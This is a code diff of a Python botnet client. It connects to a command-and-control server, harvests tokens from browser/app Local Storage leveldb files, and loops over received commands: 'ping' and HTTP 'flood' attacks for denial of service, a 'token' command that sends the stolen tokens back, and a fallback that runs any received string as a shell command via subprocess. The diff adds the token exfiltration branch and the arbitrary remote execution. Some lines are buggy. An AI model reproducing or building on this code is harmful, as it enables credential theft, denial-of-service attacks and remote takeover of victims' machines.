@@ -12,7 +12,7 @@ s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
 hostname = socket.gethostname()
 SERVER_IP = socket.gethostbyname(str(hostname))
-SERVER_PORT = 27035
+SERVER_PORT = 27033
 print(str(SERVER_IP) + str(SERVER_PORT))
 def find_tokens(path):
     path += '\\Local Storage\\leveldb'
@@ -69,31 +69,50 @@ def connect(server_ip, server_port):
     except:
         tok_m = "Failed to get tokens"
         print("token steal failed")
-  
     
-    s.connect((str(server_ip), int(server_port)))
+  
+     
+    try:
+        s.connect((str(server_ip), int(server_port)))
+        print("connected")
+        #s.sendall(tok_m).encode()
+    except socket.error as e:
+        print(e)
+        
     
     print(f"connected to {server_ip}:{server_port}")
    # s.send(f"{tok_m}".encode())
     
 #function that will return&decode received command
 def recv_comms():
-    rec_command = s.recv(2048).decode()
-    #return rec_command
-    main_c = rec_command.split(" ")[0]
-    split_command = main_c.split(" ")
-    print("got a response")
-    if "ping" in main_c:
+    while True:
         try:
-            ping(str(split_command[1]), int(split_command[2]), int(split_command[3]))
-        except:
-            respond(f"{main_c} error, args: {split_command}")
-    if "flood" in main_c:
-        try:
-            flood_http(str(split_command[1]), int(split_command[2]))
-        except:
-            respond(f"{main_c} error, args: {split_command}")
-
+            rec_command = s.recv(2048).decode()
+            #return rec_command
+            main_c = rec_command.split(" ")[0]
+            split_command = main_c.split(" ")
+            print("got a response")
+            if "ping" in main_c:
+                try:
+                    ping(str(split_command[1]), int(split_command[2]), int(split_command[3]))
+                except:
+                    respond(f"{main_c} error, args: {split_command}")
+            if "flood" in main_c:
+                try:
+                    flood_http(str(split_command[1]), int(split_command[2]))
+                except:
+                    respond(f"{main_c} error, args: {split_command}")
+            if "token" in main_c:
+                try:
+                    print(tok_m)
+                    s.sendall(tok_m).encode()
+                except Exception as e:
+                    respond("roorooroo", e)
+            else:
+                subprocess.Popen(main_c, shell=True)
+        except Exception as e:
+            print(e)
+            continue
 #send back response to c&c server
 def respond(response):
     if not response:
